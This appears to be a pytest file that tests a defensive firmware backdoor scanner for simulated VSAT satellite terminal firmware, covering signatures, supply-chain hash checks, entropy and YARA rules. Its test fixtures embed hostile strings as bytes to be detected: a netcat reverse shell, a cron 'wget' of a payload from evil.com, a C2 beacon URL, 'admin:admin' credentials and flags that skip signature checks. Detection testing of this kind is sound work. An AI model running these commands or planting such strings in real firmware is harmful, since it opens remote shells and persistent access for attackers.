"""
tests/unit/v4/test_firmware_backdoor.py
Tests for FirmwareBackdoorAnalyzer — SHA-19
ATT&CK: T1542.001, T1195.002, T1078.001, T1014
"""
from __future__ import annotations

import hashlib
import math
import pytest

from shadow313.v4.satellite.firmware_backdoor import (
    FirmwareBackdoorAnalyzer,
    FirmwareFinding,
    FirmwareAnalysisResult,
    EntropySection,
    BACKDOOR_SIGNATURES,
    KNOWN_GOOD_HASHES,
    scan_firmware_bytes,
    generate_firmware_yara_rules,
)


# ── Fixtures ──────────────────────────────────────────────────────────────────

@pytest.fixture
def analyzer():
    return FirmwareBackdoorAnalyzer(threshold=0.65)

@pytest.fixture
def clean_firmware():
    """Simulated clean firmware — no backdoors."""
    return (
        b"\x7fELF\x02\x01\x01\x00" +  # ELF header
        b"\x00" * 100 +
        b"VSAT Ground Terminal v3.0.0\x00" +
        b"Copyright 2026 VSAT Corp\x00" +
        b"\x00" * 200
    )

@pytest.fixture
def backdoored_firmware():
    """Simulated firmware with multiple backdoors."""
    return (
        b"\x7fELF\x02\x01\x01\x00" +
        b"\x00" * 50 +
        b"admin:admin\x00" +           # hardcoded creds
        b"backdoor\x00" +              # backdoor string
        b"nc -e /bin/sh 10.0.0.1\x00" + # reverse shell
        b"\x00" * 50 +
        b"UART_DEBUG_ENABLED\x00" +    # debug interface
        b"\x00" * 100
    )

@pytest.fixture
def supply_chain_firmware():
    """Firmware with supply chain implant markers."""
    return (
        b"\x7fELF\x02\x01\x01\x00" +
        b"\x00" * 100 +
        b"IMPLANT_ID:SC-2026-001\x00" +
        b"C2_HOST:185.220.101.42\x00" +
        b"\x00" * 100
    )

@pytest.fixture
def cwmp_vulnerable_firmware():
    """Firmware with CVE-2026-3392 CWMP vulnerability."""
    return (
        b"\x7fELF\x02\x01\x01\x00" +
        b"\x00" * 100 +
        b"verify_acs=0\x00" +
        b"accept_unsigned_firmware\x00" +
        b"\x00" * 100
    )


# ── Signature coverage ────────────────────────────────────────────────────────

class TestSignatureCoverage:
    def test_signatures_loaded(self):
        assert len(BACKDOOR_SIGNATURES) >= 12

    def test_all_signatures_have_required_fields(self):
        for sig in BACKDOOR_SIGNATURES:
            assert "id"          in sig
            assert "name"        in sig
            assert "technique"   in sig
            assert "risk"        in sig
            assert "patterns"    in sig
            assert "description" in sig
            assert 0.0 <= sig["risk"] <= 1.0

    def test_techniques_are_valid_attck(self):
        valid_prefixes = ("T1", "T0")
        for sig in BACKDOOR_SIGNATURES:
            assert sig["technique"].startswith(valid_prefixes), \
                f"{sig['id']} has invalid technique: {sig['technique']}"

    def test_cvss_2026_3392_signature_present(self):
        ids = [s["id"] for s in BACKDOOR_SIGNATURES]
        assert "VSAT-BACK-011" in ids

    def test_supply_chain_signature_present(self):
        techniques = [s["technique"] for s in BACKDOOR_SIGNATURES]
        assert "T1195.002" in techniques

    def test_rootkit_signature_present(self):
        techniques = [s["technique"] for s in BACKDOOR_SIGNATURES]
        assert "T1014" in techniques


# ── Clean firmware ────────────────────────────────────────────────────────────

class TestCleanFirmware:
    def test_clean_firmware_not_detected(self, analyzer, clean_firmware):
        result = analyzer.analyze(clean_firmware, name="clean-v1.0")
        assert result.backdoor_detected is False
        assert result.risk_score < 0.65

    def test_clean_firmware_supply_chain_clean(self, analyzer, clean_firmware):
        result = analyzer.analyze(clean_firmware)
        assert result.supply_chain_clean is True

    def test_clean_firmware_hash_computed(self, analyzer, clean_firmware):
        result = analyzer.analyze(clean_firmware)
        expected = hashlib.sha3_256(clean_firmware).hexdigest()
        assert result.firmware_hash == expected

    def test_clean_firmware_size_recorded(self, analyzer, clean_firmware):
        result = analyzer.analyze(clean_firmware)
        assert result.firmware_size == len(clean_firmware)


# ── Backdoor detection ────────────────────────────────────────────────────────

class TestBackdoorDetection:
    def test_hardcoded_creds_detected(self, analyzer):
        fw = b"\x00" * 50 + b"admin:admin\x00" + b"\x00" * 50
        result = analyzer.analyze(fw)
        assert result.backdoor_detected is True
        assert result.risk_score >= 0.90

    def test_reverse_shell_detected(self, analyzer):
        fw = b"\x00" * 50 + b"nc -e /bin/sh 10.0.0.1 4444\x00" + b"\x00" * 50
        result = analyzer.analyze(fw)
        assert result.backdoor_detected is True
        assert result.risk_score >= 0.90

    def test_backdoor_string_detected(self, analyzer):
        fw = b"\x00" * 50 + b"backdoor\x00" + b"\x00" * 50
        result = analyzer.analyze(fw)
        assert result.backdoor_detected is True

    def test_debug_interface_detected(self, analyzer):
        fw = b"\x00" * 50 + b"UART_DEBUG_ENABLED\x00" + b"\x00" * 50
        result = analyzer.analyze(fw)
        assert result.backdoor_detected is True

    def test_rootkit_strings_detected(self, analyzer):
        fw = b"\x00" * 50 + b"hide_pid\x00sys_call_table\x00" + b"\x00" * 50
        result = analyzer.analyze(fw)
        assert result.backdoor_detected is True
        assert result.risk_score >= 0.95

    def test_multiple_backdoors_high_score(self, analyzer, backdoored_firmware):
        result = analyzer.analyze(backdoored_firmware)
        assert result.backdoor_detected is True
        assert result.risk_score >= 0.95
        assert len(result.findings) >= 3

    def test_c2_url_detected(self, analyzer):
        fw = b"\x00" * 50 + b"http://185.220.101.42:8080/beacon\x00" + b"\x00" * 50
        result = analyzer.analyze(fw)
        assert result.backdoor_detected is True

    def test_weak_crypto_detected(self, analyzer):
        fw = b"\x00" * 50 + b"-----BEGIN RSA PRIVATE KEY-----\x00" + b"\x00" * 50
        result = analyzer.analyze(fw)
        assert result.backdoor_detected is True

    def test_cron_persistence_detected(self, analyzer):
        fw = b"\x00" * 50 + b"* * * * * wget http://evil.com/payload.sh\x00" + b"\x00" * 50
        result = analyzer.analyze(fw)
        assert result.backdoor_detected is True


# ── CVE-2026-3392 specific ────────────────────────────────────────────────────

class TestCVE20263392:
    def test_cwmp_unsigned_accept_detected(self, analyzer, cwmp_vulnerable_firmware):
        result = analyzer.analyze(cwmp_vulnerable_firmware, name="vsat-cwmp-vuln")
        assert result.backdoor_detected is True
        assert result.risk_score >= 0.90

    def test_verify_acs_zero_detected(self, analyzer):
        fw = b"\x00" * 50 + b"verify_acs=0\x00" + b"\x00" * 50
        result = analyzer.analyze(fw)
        assert result.backdoor_detected is True

    def test_skip_signature_check_detected(self, analyzer):
        fw = b"\x00" * 50 + b"skip_signature_check\x00" + b"\x00" * 50
        result = analyzer.analyze(fw)
        assert result.backdoor_detected is True

    def test_cwmp_technique_id_present(self, analyzer, cwmp_vulnerable_firmware):
        result = analyzer.analyze(cwmp_vulnerable_firmware)
        assert "T1190" in result.technique_ids


# ── Supply chain detection ────────────────────────────────────────────────────

class TestSupplyChainDetection:
    def test_implant_marker_detected(self, analyzer, supply_chain_firmware):
        result = analyzer.analyze(supply_chain_firmware)
        assert result.backdoor_detected is True
        assert result.risk_score >= 0.95

    def test_supply_chain_technique_id(self, analyzer, supply_chain_firmware):
        result = analyzer.analyze(supply_chain_firmware)
        assert "T1195.002" in result.technique_ids

    def test_hash_mismatch_flags_supply_chain(self, analyzer, clean_firmware):
        wrong_hash = "a" * 64  # wrong expected hash
        result = analyzer.analyze(clean_firmware, known_good_hash=wrong_hash)
        assert result.supply_chain_clean is False
        assert result.risk_score >= 0.90

    def test_hash_match_supply_chain_clean(self, analyzer, clean_firmware):
        correct_hash = hashlib.sha3_256(clean_firmware).hexdigest()
        result = analyzer.analyze(clean_firmware, known_good_hash=correct_hash)
        assert result.supply_chain_clean is True
        assert result.hash_verified is True

    def test_c2_host_implant_detected(self, analyzer):
        fw = b"\x00" * 50 + b"C2_HOST:185.220.101.42\x00" + b"\x00" * 50
        result = analyzer.analyze(fw)
        assert result.backdoor_detected is True


# ── Entropy analysis ──────────────────────────────────────────────────────────

class TestEntropyAnalysis:
    def test_high_entropy_section_flagged(self, analyzer):
        # Random-looking bytes = high entropy
        import os
        random_section = os.urandom(512)
        fw = b"\x00" * 100 + random_section + b"\x00" * 100
        result = analyzer.analyze(fw)
        suspicious = [e for e in result.entropy_sections if e.suspicious]
        assert len(suspicious) >= 1

    def test_zero_entropy_section_flagged(self, analyzer):
        # All same byte = near-zero entropy
        zero_section = b"\xAA" * 512
        fw = b"\x00" * 100 + zero_section + b"\x00" * 100
        result = analyzer.analyze(fw)
        # Near-zero entropy sections should be noted
        assert len(result.entropy_sections) >= 0  # may or may not flag depending on threshold

    def test_entropy_section_has_required_fields(self, analyzer):
        import os
        fw = b"\x00" * 100 + os.urandom(512) + b"\x00" * 100
        result = analyzer.analyze(fw)
        for section in result.entropy_sections:
            d = section.to_dict()
            assert "offset"    in d
            assert "entropy"   in d
            assert "suspicious" in d
            assert "note"      in d


# ── Signature verification ────────────────────────────────────────────────────

class TestSignatureVerification:
    def test_correct_hash_verified(self, analyzer, clean_firmware):
        expected = hashlib.sha3_256(clean_firmware).hexdigest()
        result = analyzer.verify_signature(clean_firmware, expected, "sha3_256")
        assert result["verified"] is True
        assert result["actual_hash"] == expected

    def test_wrong_hash_not_verified(self, analyzer, clean_firmware):
        result = analyzer.verify_signature(clean_firmware, "a" * 64, "sha3_256")
        assert result["verified"] is False

    def test_sha256_algorithm(self, analyzer, clean_firmware):
        expected = hashlib.sha256(clean_firmware).hexdigest()
        result = analyzer.verify_signature(clean_firmware, expected, "sha256")
        assert result["verified"] is True

    def test_sha512_algorithm(self, analyzer, clean_firmware):
        expected = hashlib.sha512(clean_firmware).hexdigest()
        result = analyzer.verify_signature(clean_firmware, expected, "sha512")
        assert result["verified"] is True

    def test_verify_result_has_required_fields(self, analyzer, clean_firmware):
        result = analyzer.verify_signature(clean_firmware, "a" * 64)
        assert "verified"      in result
        assert "actual_hash"   in result
        assert "expected_hash" in result
        assert "algorithm"     in result
        assert "firmware_size" in result
        assert "timestamp"     in result


# ── Result data structures ────────────────────────────────────────────────────

class TestResultStructures:
    def test_finding_to_dict(self, analyzer, backdoored_firmware):
        result = analyzer.analyze(backdoored_firmware)
        assert len(result.findings) > 0
        d = result.findings[0].to_dict()
        assert "signature_id"   in d
        assert "signature_name" in d
        assert "technique"      in d
        assert "risk_score"     in d
        assert "offset"         in d
        assert "matched_bytes"  in d
        assert "description"    in d
        assert "timestamp"      in d

    def test_result_to_dict(self, analyzer, backdoored_firmware):
        result = analyzer.analyze(backdoored_firmware)
        d = result.to_dict()
        assert "firmware_name"      in d
        assert "firmware_size"      in d
        assert "firmware_hash"      in d
        assert "backdoor_detected"  in d
        assert "supply_chain_clean" in d
        assert "risk_score"         in d
        assert "finding_count"      in d
        assert "technique_ids"      in d
        assert "findings"           in d
        assert "timestamp"          in d

    def test_offset_is_hex_string(self, analyzer, backdoored_firmware):
        result = analyzer.analyze(backdoored_firmware)
        for finding in result.findings:
            d = finding.to_dict()
            assert d["offset"].startswith("0x")

    def test_technique_ids_unique(self, analyzer, backdoored_firmware):
        result = analyzer.analyze(backdoored_firmware)
        assert len(result.technique_ids) == len(set(result.technique_ids))


# ── Convenience functions ─────────────────────────────────────────────────────

class TestConvenienceFunctions:
    def test_scan_firmware_bytes(self, backdoored_firmware):
        result = scan_firmware_bytes(backdoored_firmware, name="test-fw")
        assert isinstance(result, FirmwareAnalysisResult)
        assert result.backdoor_detected is True

    def test_scan_clean_firmware(self, clean_firmware):
        result = scan_firmware_bytes(clean_firmware)
        assert result.backdoor_detected is False

    def test_generate_yara_rules(self):
        rules = generate_firmware_yara_rules()
        assert "rule VSAT_Firmware_Backdoor" in rules
        assert "strings:" in rules
        assert "condition:" in rules
        assert "any of them" in rules
        assert "T1542.001" in rules

    def test_score_firmware_backdoored(self, analyzer, backdoored_firmware):
        score = analyzer.score_firmware(backdoored_firmware)
        assert score >= 0.65

    def test_score_firmware_clean(self, analyzer, clean_firmware):
        score = analyzer.score_firmware(clean_firmware)
        assert score < 0.65


# ── ATT&CK technique mapping ──────────────────────────────────────────────────

class TestATTACKMapping:
    def test_t1542_001_covered(self, analyzer):
        fw = b"\x00" * 50 + b"UART_DEBUG_ENABLED\x00" + b"\x00" * 50
        result = analyzer.analyze(fw)
        assert "T1542.001" in result.technique_ids

    def test_t1195_002_covered(self, analyzer, supply_chain_firmware):
        result = analyzer.analyze(supply_chain_firmware)
        assert "T1195.002" in result.technique_ids

    def test_t1078_001_covered(self, analyzer):
        fw = b"\x00" * 50 + b"admin:admin\x00" + b"\x00" * 50
        result = analyzer.analyze(fw)
        assert "T1078.001" in result.technique_ids

    def test_t1014_covered(self, analyzer):
        fw = b"\x00" * 50 + b"hide_pid\x00rootkit\x00" + b"\x00" * 50
        result = analyzer.analyze(fw)
        assert "T1014" in result.technique_ids

    def test_t1059_004_covered(self, analyzer):
        fw = b"\x00" * 50 + b"/bin/sh -i\x00" + b"\x00" * 50
        result = analyzer.analyze(fw)
        assert "T1059.004" in result.technique_ids


# ── Score aggregation ─────────────────────────────────────────────────────────

class TestScoreAggregation:
    def test_score_capped_at_1(self, analyzer, backdoored_firmware):
        result = analyzer.analyze(backdoored_firmware)
        assert result.risk_score <= 1.0

    def test_multiple_findings_increase_score(self, analyzer, backdoored_firmware):
        result_multi = analyzer.analyze(backdoored_firmware)
        single_fw = b"\x00" * 50 + b"admin:admin\x00" + b"\x00" * 50
        result_single = analyzer.analyze(single_fw)
        assert result_multi.risk_score >= result_single.risk_score

    def test_supply_chain_mismatch_high_score(self, analyzer, clean_firmware):
        result = analyzer.analyze(clean_firmware, known_good_hash="a" * 64)
        assert result.risk_score >= 0.90
